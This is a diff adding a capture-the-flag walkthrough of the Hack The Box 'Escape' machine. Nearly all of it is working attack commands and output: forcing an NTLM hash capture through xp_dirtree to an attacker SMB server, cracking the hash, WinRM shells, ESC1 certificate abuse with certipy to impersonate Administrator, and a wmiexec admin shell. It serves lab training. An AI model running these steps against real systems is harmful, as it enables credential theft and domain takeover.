@@ -406,93 +406,310 @@ SMB         10.10.11.202    445    DC               [+] sequel.htb\PublicUser:Gu
 
 
 
+```bash
+❯ impacket-mssqlclient sequel.htb/'PublicUser':'GuestUserCantWrite1'@10.10.11.202 2>/dev/null
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
+[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (PublicUser  guest@master)> enum_db;
+name     is_trustworthy_on   
+------   -----------------   
+master                   0   
 
+tempdb                   0   
 
+model                    0   
 
+msdb                     1  
+```
 
 
 
+```bash
+SQL (PublicUser  guest@master)> EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.
+ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
+ERROR(DC\SQLMOCK): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
+ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
+```
 
 
 
+```bash
+❯ smbserver.py smbFolder $(pwd) -smb2support
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+```
 
 
 
+```bash
+SQL (PublicUser  guest@master)> EXEC Master.dbo.xp_dirtree"\\10.10.16.3\x",1,1;
+subdirectory   depth   file   
+------------   -----   ----   
+SQL (PublicUser  guest@master)>
+```
 
 
 
+```bash
+❯ smbserver.py smbFolder $(pwd) -smb2support
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.11.202,55936)
+[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
+[*] User DC\sql_svc authenticated successfully
+[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:e88ef89eb51ddb11681649f6078294fe:010100000000000080cbce391483db01e9c1c347e2fa202900000000010010006d006c004300430052006b0066006d00030010006d006c004300430052006b0066006d00020010006500610050004a007000710057007100040010006500610050004a0070007100570071000700080080cbce391483db01060004000200000008003000300000000000000000000000003000008e95df638ff6f53618e3a9748a9c51690f0ea0b3d458d87764b8c66a702fd6500a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0033000000000000000000
+[*] Closing down connection (10.10.11.202,55936)
+[*] Remaining connections []
+```
 
 
 
+```bash
+❯ hashcat -a 0 hashes /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting in autodetect mode
 
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 2913/5891 MB (1024 MB allocatable), 8MCU
 
+Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+The following mode was auto-detected as the only one matching your input hash:
 
+5600 | NetNTLMv2 | Network Protocol
 
+NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
+Do NOT report auto-detect issues unless you are certain of the hash type.
 
+SQL_SVC::sequel:aaaaaaaaaaaaaaaa:e88ef89eb51ddb11681649f6078294fe:010100000000000080cbce391483db01e9c1c347e2fa202900000000010010006d006c004300430052006b0066006d00030010006d006c004300430052006b0066006d00020010006500610050004a007000710057007100040010006500610050004a0070007100570071000700080080cbce391483db01060004000200000008003000300000000000000000000000003000008e95df638ff6f53618e3a9748a9c51690f0ea0b3d458d87764b8c66a702fd6500a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0033000000000000000000:REGGIE1234ronnie
+```
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+```bash
+❯ nxc smb 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
+SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.202    445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
+❯ nxc winrm 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
+WINRM       10.10.11.202    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
+WINRM       10.10.11.202    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
+```
+
+
+
+```bash
+❯ evil-winrm -i 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
+```
+
+
+
+```powershell
+*Evil-WinRM* PS C:\SQLServer\Logs> ls
+
+
+    Directory: C:\SQLServer\Logs
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
+
+
+*Evil-WinRM* PS C:\SQLServer\Logs> download ERRORLOG.BAK
+                                        
+Info: Downloading C:\SQLServer\Logs\ERRORLOG.BAK to ERRORLOG.BAK
+                                        
+Info: Download successful!
+```
+
+
+
+{% code title="ERRORLOG.BAK" %}
+```bash
+2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
+2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+```
+{% endcode %}
+
+
+
+```bash
+❯ nxc winrm 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
+WINRM       10.10.11.202    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
+WINRM       10.10.11.202    5985   DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)
+❯ evil-winrm -i 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> type ../Desktop/user.txt
+4b79e2057279cc62d102952efa6f1bfd
+```
+
+
+
+```bash
+❯ sudo ntpdate -s 10.10.11.202
+```
+
+
+
+```bash
+❯ certipy-ad find -u 'Ryan.Cooper'@10.10.11.202 -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -vulnerable -stdout
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'sequel-DC-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : sequel-DC-CA
+    DNS Name                            : dc.sequel.htb
+    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
+    Certificate Validity End            : 2121-11-18 21:08:46+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : SEQUEL.HTB\Administrators
+      Access Rights
+        ManageCertificates              : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        ManageCa                        : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Enroll                          : SEQUEL.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : UserAuthentication
+    Display Name                        : UserAuthentication
+    Certificate Authorities             : sequel-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : PublishToDs
+                                          IncludeSymmetricAlgorithms
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+                                          Secure Email
+                                          Encrypting File System
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 10 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Domain Users
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Administrator
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+        Write Property Principals       : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+    [!] Vulnerabilities
+      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
+```
+
+
+
+{% embed url="https://kogre.gitbook.io/pentest-notes/windows-pentesting/active-directory/active-directory-certificate-services-adcs#esc1" %}
+
+
+
+```bash
+❯ certipy-ad req -u Ryan.Cooper@sequel.htb -p "NuclearMosquito3" -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb -dc-ip 10.10.11.202
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 15
+[*] Got certificate with UPN 'administrator@sequel.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+
+
+```bash
+❯ certipy-ad auth -pfx administrator.pfx -username Administrator -domain sequel.htb
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@sequel.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
+```
+
+
+
+```bash
+❯ KRB5CCNAME=administrator.ccache wmiexec.py sequel.htb/Administrator@dc.sequel.htb -k -no-pass
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+sequel\administrator
+
+C:\>type C:\Users\Administrator\Desktop\root.txt
+fbbbbb4a36374705a42e8563bd1709b7
+```
